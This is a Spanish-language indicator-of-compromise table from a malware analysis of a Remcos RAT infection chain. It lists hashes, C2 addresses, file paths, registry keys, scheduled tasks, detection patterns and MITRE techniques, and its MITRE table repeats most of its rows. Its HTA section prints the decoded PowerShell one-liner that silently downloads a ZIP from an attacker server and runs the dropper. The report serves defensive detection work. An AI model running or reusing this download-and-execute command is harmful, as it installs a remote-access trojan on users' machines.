# TABLA DE IOC - REMCOS RAT (SyAlpha16.exe)

**Malware:** Remcos RAT (Remote Control & Surveillance) 
**Autores:** Angel Gil && Jorge Felix  
**Vector Inicial:** Romulo.hta (HTML Application con VBScript)  
**Dropper:** SyAlpha16.exe (Delphi)  
**SHA-256 Principales:** `9f84bbd8179674ee35fd11e94435df0c49c81bb5ca44c2f5ad4b5bec53f0ab35 && ABC0DA03C59F60C7F99D40EFFDA14C05057134082B681E776F18D2BBF21CF459 && ADB8347DFA1B1DF1CA2211FE4D7E82F27CED939F1BF3D52548E52BC9E23FC52C `
---

## CADENA DE INFECCIÓN COMPLETA

```
[ETAPA 0] Romulo.hta → Descarga y ejecuta SyAlpha16.exe
    ↓
[ETAPA 1] SyAlpha16.exe (PID 8884) - DROPPER
    ↓
[ETAPA 2] SyAlpha16.exe (PID 1176) - LOADER
    ↓
[ETAPA 3] FrameTrac32.exe (PID 8364) - REMCOS RAT
    ↓
[ETAPA 4] Chime.exe (PID 8392) - PERSISTENCE HELPER
```

---

## INDICADORES DE COMPROMISO (IOC)

### 0. VECTOR INICIAL (HTA)

| Tipo | Valor | Descripción | MITRE |
|------|-------|-------------|-------|
| **Archivo HTA** | `Romulo.hta` | HTML Application con VBScript ofuscado que descarga el dropper | T1105, T1059.001 |
| **URL Descarga** | `http://192.159.99.10/XSyAlpha16.zip` | Servidor de descarga del payload | T1105, T1566.002 |
| **Archivo ZIP** | `XSyAlpha16.zip` | Archivo comprimido descargado | T1105 |
| **Ruta Descarga** | `C:\Users\Public\SyAlpha16.zip` | Ubicación temporal del ZIP descargado | T1105 |
| **Ruta Extracción** | `C:\Users\Public\` | Directorio donde se extrae el ZIP | T1105 |
| **Ejecutable Descargado** | `C:\Users\Public\SyAlpha16.exe` | Dropper ejecutado desde Public (antes de moverse a Downloads) | T1204.002 |

**Payload Decodificado del HTA:**
```powershell
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "Start-BitsTransfer -Source 'http://192.159.99.10/XSyAlpha16.zip' -Destination 'C:\Users\Public\SyAlpha16.zip'; Expand-Archive -Path 'C:\Users\Public\SyAlpha16.zip' -DestinationPath 'C:\Users\Public\' -Force; Start-Process -FilePath 'C:\Users\Public\SyAlpha16.exe' -WindowStyle Hidden"
```

**Características del HTA:**
- **Título:** "Documento" (genérico para evadir detección)
- **Ventana:** Minimizada, sin barra de tareas (`WINDOWSTATE="minimize"`, `SHOWINTASKBAR="no"`)
- **Ofuscación:** Strings hexadecimales con XOR (clave: 55)
- **Función de decodificación:** `ProcessRoutine886()`
- **Variables ofuscadas:** `tlh0` a `tlh9` (concatenadas y decodificadas)
- **Ejecución:** Usa `WScript.Shell.Run()` con ventana oculta (`0`)

**IOC Adicionales del HTA:**
- **Strings característicos:** `ProcessRoutine886`, `WScript.Shell`, `Start-BitsTransfer`
- **Patrón de ofuscación:** Variables con nombres aleatorios (`tlh0`, `pleju`, `sezbjs`, `sgzzt`, `plc`)
- **Técnica de evasión:** Ejecución de PowerShell con `-ExecutionPolicy Bypass` y `-WindowStyle Hidden`

---

### 1. HASHES

| Tipo | Valor | Descripción |
|------|-------|-------------|
| SHA-256 | `9f84bbd8179674ee35fd11e94435df0c49c81bb5ca44c2f5ad4b5bec53f0ab35` | Hash del dropper original SyAlpha16.exe |

**Nota:** Los archivos generados durante la ejecución (FrameTrac32.exe, Chime.exe, DLLs) pueden tener hashes diferentes en cada campaña, pero el dropper inicial mantiene este hash.

---

### 2. DIRECCIONES IP Y PUERTOS

| Tipo | Valor | Puerto | Protocolo | Descripción | MITRE |
|------|-------|--------|------------|-------------|-------|
| **IPv4 (C2)** | `192.159.99.19` | `1122` | TCP | Servidor C2 de Remcos RAT | T1071, T1573.001 |
| **IPv4 (Download)** | `192.159.99.10` | `80` | HTTP | Servidor de descarga del payload inicial | T1105, T1566.002 |
| **URL** | `http://192.159.99.10/XSyAlpha16.zip` | - | HTTP | URL completa del payload descargado | T1105, T1566.002 |

**Patrón de Beaconing:**
- Intervalo entre reconexiones: ~22 segundos
- 4 intentos de conexión por sesión
- Puerto local incremental (49780, 49781, 49782, 49783...)
- Protocolo propietario Remcos con cifrado RC4

---

### 3. RUTAS DE ARCHIVOS

| Tipo | Ruta | Descripción | MITRE |
|------|------|-------------|-------|
| **Vector Inicial** | `Romulo.hta` | Archivo HTA inicial (ubicación variable, típicamente descargado o adjunto en email) | T1105, T1059.001 |
| **ZIP Descargado** | `C:\Users\Public\SyAlpha16.zip` | Archivo ZIP descargado por el HTA | T1105 |
| **Dropper Inicial** | `C:\Users\Public\SyAlpha16.exe` | Dropper ejecutado desde Public (primera ejecución) | T1204.002 |
| **Dropper Persistente** | `C:\ProgramData\store_adapter_x64\SyAlpha16.exe` | Copia persistente del dropper (2.5 MB) | T1053.005 |
| **RAT Principal** | `C:\Users\<USER>\AppData\Local\FrameTrac32.exe` | Ejecutable del Remcos RAT (413 KB) | T1055.012 |
| **Persistence Helper** | `C:\Users\<USER>\AppData\Local\store_adapter_x64\Chime.exe` | Helper que establece persistencia (634 KB) | T1053.005 |
| **DLL Inyectable** | `C:\Users\<USER>\AppData\Local\Temp\39D9641.tmp` | DLL cifrada inyectada en FrameTrac32.exe (557 KB) | T1055.012, T1027.002 |
| **Payload Cifrado** | `C:\Users\<USER>\AppData\Local\Temp\37E899E.tmp` | Blob cifrado del payload principal (1.7 MB) | T1027.002 |
| **Token IPC** | `C:\Users\<USER>\AppData\Local\Temp\3ECB69C.tmp` | Token/clave de sincronización (40 bytes) | T1027.009 |
| **Keylogger Output** | `C:\ProgramData\dt\logs.dat` | Archivo de salida del keylogger offline | T1056.001 |
| **Scheduled Task** | `C:\Windows\Tasks\CLI.job` | Tarea programada legacy (TS 1.0) - 274 bytes | T1053.005 |
| **Scheduled Task XML** | `C:\Windows\System32\Tasks\CLI` | Tarea programada moderna (TS 2.0) - XML | T1053.005 |
| **Fake Logs** | `C:\Users\<USER>\AppData\Roaming\PCGameBoost\Smart Game Booster\Logs\SyAlpha16AppRun.log` | Logs falsos para camuflaje (508 bytes) | T1036.004 |
| **MadExcept Dir** | `C:\Users\<USER>\AppData\Local\Temp\SyAlpha16.madExcept\` | Directorio de manejo de excepciones Delphi | - |

#### DLLs y Componentes en `C:\ProgramData\store_adapter_x64\`

| Archivo | Tamaño | Descripción |
|---------|--------|-------------|
| `Focus.dll` | 555,008 bytes | Módulo auxiliar del RAT |
| `HardwareLib.dll` | 189,952 bytes | Módulo de reconocimiento de hardware |
| `Temperature.dll` | 177,664 bytes | Módulo auxiliar (camuflaje) |
| `webres.dll` | 904,192 bytes | Módulo de comunicaciones web |
| `rtl120.bpl` | 1,115,136 bytes | Delphi XE3 Runtime Library |
| `vcl120.bpl` | 2,014,720 bytes | Delphi XE3 Visual Component Library |
| `Saikdrarceer.opiw` | 25,439 bytes | Datos cifrados/configuración |
| `Droulcleendrood.qks` | 1,533,246 bytes | Payload principal cifrado |

**Nota:** Los archivos en `store_adapter_x64` tienen timestamps falsificados (LastWriteTime: 11/15/2025) pero ChangeTime real (T1070.006).

---

### 4. CLAVES DE REGISTRO

| Tipo | Clave | Valor | Descripción | MITRE |
|------|-------|-------|-------------|-------|
| **Config RAT** | `HKCU\SOFTWARE\Rmc-3BDZ4Q\` | Árbol completo | Configuración principal del Remcos RAT | T1112 |
| **Config Cifrada** | `HKCU\SOFTWARE\Rmc-3BDZ4Q\cuatlfw` | REG_BINARY (84 bytes) | Configuración cifrada (IP C2, puerto, módulos) | T1573.001 |
| **Hash Integridad** | `HKCU\SOFTWARE\Rmc-3BDZ4Q\uwvstck` | REG_SZ: `A4855D857EAA75E1530A4864E2AB70F1` | Hash MD5 para verificación de integridad | - |
| **UID Víctima** | `HKCU\SOFTWARE\Rmc-3BDZ4Q\UID` | REG_DWORD: `428899031` | Identificador único de la víctima | - |
| **Timestamp** | `HKCU\SOFTWARE\Rmc-3BDZ4Q\ailm` | REG_DWORD: `1770751486` | Timestamp de instalación (epoch Unix) | - |
| **Clipboard Logger** | `HKCU\SOFTWARE\Rmc-3BDZ4Q\CooLib` | (Consultado, no creado) | Estado del clipboard logger | T1115 |
| **Keyboard Config** | `HKCU\SOFTWARE\Rmc-3BDZ4Q\nwed` | (Consultado, no creado) | Configuración de teclado | T1056.001 |
| **Operation Mode** | `HKCU\SOFTWARE\Rmc-3BDZ4Q\okmode` | (Consultado, no creado) | Modo de operación | - |
| **Status Beacon** | `HKCU\SOFTWARE\Rmc-3BDZ4Q\bpbagtvi` | (Consultado cada ~3 seg) | Heartbeat del RAT (verifica comandos C2) | T1071 |
| **BAM Evidence** | `HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\<SID>\...\Chime.exe` | - | Registro de ejecución de Chime.exe en BAM | - |

**Persistencias Latentes (templates en memoria, no ejecutadas):**
- `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\` (T1547.001)
- `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\` (T1547.001)
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` (T1547.001)

---

### 5. MUTEX Y NAMED OBJECTS

| Tipo | Valor | Descripción | MITRE |
|------|-------|-------------|-------|
| **Mutex** | `Rmc-3BDZ4Q` | Mutex para control de instancia única | T1104 |
| **Kernel Object** | `\Sessions\1\BaseNamedObjects\Rmc-3BDZ4Q` | Objeto nombrado del kernel | T1104 |

**Nota:** El sufijo `3BDZ4Q` es aleatorio y puede variar entre campañas. El prefijo `Rmc-` es consistente con Remcos.

---

### 6. VARIABLES DE ENTORNO

| Variable | Valor | Descripción | MITRE |
|----------|-------|-------------|-------|
| `GLEDSZLAVXNMFDXBKWBNV` | `pqrfftgwn` | Flag/token de control | T1027.009 |
| `JFTWAEPAAJXCSXDCCJARPKGGA` | `C:\ProgramData\store_adapter_x64\SyAlpha16.exe` | Ruta del loader | T1027.009 |
| `KYODXHLJLNHUWROQLAC` | `C:\Users\<USER>\AppData\Local\Temp\37E899E.tmp` | Payload cifrado | T1027.009 |
| `MDHWXQZIXALHFWKIJRVM` | `C:\Users\<USER>\AppData\Local\Temp\3ECB69C.tmp` | Clave/token | T1027.009 |

**Nota:** Los nombres de variables son aleatorios y cambian entre ejecuciones. El patrón es usar variables con nombres largos y aleatorios como mecanismo IPC ofuscado.

---

### 7. SCHEDULED TASKS

| Nombre | Tipo | Ruta | Descripción | MITRE |
|--------|------|------|-------------|-------|
| `CLI` | Task Scheduler 1.0 (.job) | `C:\Windows\Tasks\CLI.job` | Tarea legacy (274 bytes) | T1053.005 |
| `CLI` | Task Scheduler 2.0 (XML) | `C:\Windows\System32\Tasks\CLI` | Tarea moderna (vía RPC) | T1053.005 |

**Nota:** Se crean AMBAS tareas (TS 1.0 y TS 2.0) para redundancia de persistencia.

---

### 8. NOMBRES DE PROCESOS

| Nombre | PID | Descripción | MITRE |
|--------|-----|-------------|-------|
| `SyAlpha16.exe` | Variable | Dropper/Loader (Delphi) | T1204.002 |
| `FrameTrac32.exe` | Variable | Remcos RAT principal | T1055.012 |
| `Chime.exe` | Variable | Persistence Helper | T1053.005 |

**Nota:** Los nombres pueden variar entre campañas. Buscar procesos con:
- Nombres genéricos ejecutándose desde `AppData\Local` o `ProgramData`
- Procesos WOW64 (32-bit) con alta actividad de red
- Procesos que cargan DLLs desde `Temp` antes de su imagen principal

---

### 9. PATRONES DE DETECCIÓN

#### Patrones del Vector Inicial (HTA)
- Archivos `.hta` con nombres genéricos (ej: `Romulo.hta`, `Documento.hta`)
- Ejecución de `mshta.exe` con archivos HTA
- PowerShell ejecutado con `-ExecutionPolicy Bypass` y `-WindowStyle Hidden`
- Uso de `Start-BitsTransfer` para descargas
- Variables VBScript con nombres aleatorios (`tlh0`, `pleju`, `sezbjs`, etc.)
- Función de decodificación XOR con strings hexadecimales
- Descargas a `C:\Users\Public\` desde IPs desconocidas

#### Patrones de Archivos Temporales
- Archivos `.tmp` en `AppData\Local\Temp\` con nombres hexadecimales (ej: `39D9641.tmp`, `37E899E.tmp`, `3ECB69C.tmp`)
- Archivos con extensiones inventadas (`.opiw`, `.qks`) en `ProgramData`
- Archivos ZIP descargados en `C:\Users\Public\` con nombres sospechosos

#### Patrones de Directorios
- Directorios con nombres que imitan componentes de Windows: `store_adapter_x64`
- Directorios de camuflaje: `PCGameBoost\Smart Game Booster`
- Directorios de keylogger: `C:\ProgramData\dt\`

#### Patrones de Red
- Conexiones TCP salientes al puerto `1122`
- Múltiples intentos de reconexión con intervalos regulares (~22 seg)
- Puertos locales incrementales en cada sesión

#### Patrones de Registro
- Claves de registro bajo `HKCU\SOFTWARE\Rmc-*` (el sufijo es aleatorio)
- Consultas repetidas a `bpbagtvi` cada ~3 segundos (heartbeat)

#### Patrones de Memoria
- DLLs cargadas ANTES de la imagen del proceso principal (Early Bird Injection)
- Image Base de DLL inyectada: `0x1d0000`
- Image Base de EXE shell: `0x320000`

---

### 10. STRINGS CARACTERÍSTICOS

#### Strings del Vector Inicial (HTA)
| String | Descripción |
|--------|-------------|
| `ProcessRoutine886` | Función de decodificación XOR en el HTA |
| `WScript.Shell` | Objeto COM usado para ejecutar comandos |
| `Start-BitsTransfer` | Cmdlet PowerShell para descarga |
| `XSyAlpha16.zip` | Nombre del archivo descargado |
| `Romulo.hta` | Nombre del archivo HTA inicial |
| `Documento` | Título genérico del HTA (camuflaje) |

#### Strings del RAT (Remcos)
| String | Descripción |
|--------|-------------|
| `Remcos Agent initialized (` | Inicialización del RAT |
| `Remcos v` | Versión del RAT |
| `Remcos restarted by watchdog!` | Sistema de auto-reinicio |
| `remcos.exe` | Nombre original del binario |
| `rmclient.exe` | Cliente de control remoto |
| `Watchdog module activated` | Módulo watchdog activo |
| `Offline Keylogger Started` | Keylogger offline activado |
| `Online Keylogger Started` | Keylogger online activado |
| `Smart Game Booster` | Nombre de camuflaje |

---

### 11. TÉCNICAS MITRE ATT&CK OBSERVADAS

| Táctica | Técnica | ID | Descripción |
|---------|---------|----|----|
| **Initial Access** | Spearphishing Attachment | T1566.001 | HTA adjunto en email (Romulo.hta) |
| **Initial Access** | User Execution | T1204.002 | Usuario ejecutó el HTA y luego el malware desde Downloads |
| **Execution** | Command and Scripting Interpreter | T1059.001 | PowerShell ejecutado por el HTA con -ExecutionPolicy Bypass |
| **Execution** | Native API | T1106 | WOW64, COM interfaces |
| **Persistence** | Scheduled Task | T1053.005 | CLI.job (TS 1.0) + Task XML (TS 2.0) |
| **Persistence** | Registry Run Keys | T1547.001 | Template en memoria (latente) |
| **Persistence** | Startup Folder | T1547.001 | Template en memoria (latente) |
| **Privilege Escalation** | UAC Bypass | T1548.002 | Comando EnableLUA=0 preparado |
| **Defense Evasion** | Timestomp | T1070.006 | LastWriteTime → 11/15/2025 |
| **Defense Evasion** | Masquerading | T1036.004 | "Smart Game Booster" fake, "Documento" en HTA |
| **Defense Evasion** | Process Hollowing | T1055.012 | DLL antes de imagen proceso |
| **Defense Evasion** | Software Packing | T1027.002 | DLL cifrada, header MZ reconstruido |
| **Defense Evasion** | Obfuscated Files | T1027 | Env vars ofuscadas, .tmp names, HTA con XOR |
| **Defense Evasion** | Disable Defender | T1562.001 | Add-MpPreference -ExclusionPath |
| **Command and Control** | Ingress Tool Transfer | T1105 | Descarga de XSyAlpha16.zip desde 192.159.99.10 |
| **Credential Access** | Keylogging | T1056.001 | Keylogger offline + online |
| **Discovery** | Process Discovery | T1057 | psapi.dll cargada |
| **Discovery** | System Info | T1082 | Hardware enumeration DLLs |
| **Collection** | Input Capture | T1056.001 | logs.dat keylogger output |
| **Collection** | Clipboard Data | T1115 | CooLib registro value |
| **Collection** | Screen Capture | T1113 | GdiPlus.dll cargada |
| **Collection** | Audio Capture | T1123 | winmm.dll cargada |
| **Command and Control** | Non-Standard Port | T1571 | TCP 1122 |
| **Command and Control** | Encrypted Channel | T1573.001 | RC4 encryption (Remcos) |
| **Command and Control** | Application Protocol | T1071 | Protocolo propietario Remcos |
| Execution | Native API | T1106 | WOW64, COM interfaces |
| Persistence | Scheduled Task | T1053.005 | CLI.job (TS 1.0) + Task XML (TS 2.0) |
| Persistence | Registry Run Keys | T1547.001 | Template en memoria (latente) |
| Persistence | Startup Folder | T1547.001 | Template en memoria (latente) |
| Privilege Escalation | UAC Bypass | T1548.002 | Comando EnableLUA=0 preparado |
| Defense Evasion | Timestomp | T1070.006 | LastWriteTime → 11/15/2025 |
| Defense Evasion | Masquerading | T1036.004 | "Smart Game Booster" fake |
| Defense Evasion | Process Hollowing | T1055.012 | DLL antes de imagen proceso |
| Defense Evasion | Software Packing | T1027.002 | DLL cifrada, header MZ reconstruido |
| Defense Evasion | Obfuscated Files | T1027 | Env vars ofuscadas, .tmp names |
| Defense Evasion | Disable Defender | T1562.001 | Add-MpPreference -ExclusionPath |
| Credential Access | Keylogging | T1056.001 | Keylogger offline + online |
| Discovery | Process Discovery | T1057 | psapi.dll cargada |
| Discovery | System Info | T1082 | Hardware enumeration DLLs |
| Collection | Input Capture | T1056.001 | logs.dat keylogger output |
| Collection | Clipboard Data | T1115 | CooLib registro value |
| Collection | Screen Capture | T1113 | GdiPlus.dll cargada |
| Collection | Audio Capture | T1123 | winmm.dll cargada |
| Command and Control | Non-Standard Port | T1571 | TCP 1122 |
| Command and Control | Encrypted Channel | T1573.001 | RC4 encryption (Remcos) |
| Command and Control | Application Protocol | T1071 | Protocolo propietario Remcos |

---

**Última actualización:** 10 de Febrero de 2026  
**Fuente:** INFORME_DFIR_COMPLETO.md

